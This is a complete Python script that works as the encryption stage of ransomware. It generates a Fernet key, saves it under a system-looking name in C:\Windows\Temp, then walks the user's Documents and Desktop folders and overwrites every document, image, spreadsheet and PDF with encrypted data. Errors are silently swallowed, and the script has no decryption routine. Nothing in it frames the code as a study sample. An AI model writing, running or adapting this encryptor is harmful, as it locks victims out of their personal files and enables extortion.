import os
import sys
from cryptography.fernet import Fernet

def generate_key(key_path: str) -> None:
    """Generate a symmetric encryption key and save to file."""
    key = Fernet.generate_key()
    with open(key_path, 'wb') as key_file:
        key_file.write(key)

def load_key(key_path: str) -> bytes:
    """Load encryption key from file."""
    with open(key_path, 'rb') as key_file:
        return key_file.read()

def encrypt_file(file_path: str, fernet: Fernet) -> None:
    """Encrypt a single file and overwrite original."""
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(file_path, 'wb') as f:
        f.write(encrypted)

def find_target_files(root_dir: str, extensions: tuple) -> list:
    """Recursively find files with given extensions."""
    matches = []
    for dirpath, _, filenames in os.walk(root_dir):
        for fname in filenames:
            if fname.lower().endswith(extensions):
                matches.append(os.path.join(dirpath, fname))
    return matches

def main(target_dirs: list, extensions: tuple, key_path: str) -> None:
    """Main execution: generate key, find files, encrypt."""
    generate_key(key_path)
    key = load_key(key_path)
    fernet = Fernet(key)
    for target_dir in target_dirs:
        if not os.path.exists(target_dir):
            continue
        files = find_target_files(target_dir, extensions)
        for fpath in files:
            try:
                encrypt_file(fpath, fernet)
            except Exception:
                continue

if __name__ == "__main__":
    # Configuration: directories to target and file extensions
    TARGET_DIRS = [os.path.expanduser("~\\Documents"), os.path.expanduser("~\\Desktop")]
    TARGET_EXTS = ('.txt', '.docx', '.jpg', '.png', '.xlsx', '.pdf')
    KEY_OUT = "C:\\Windows\\Temp\\sys_key.bin"
    main(TARGET_DIRS, TARGET_EXTS, KEY_OUT)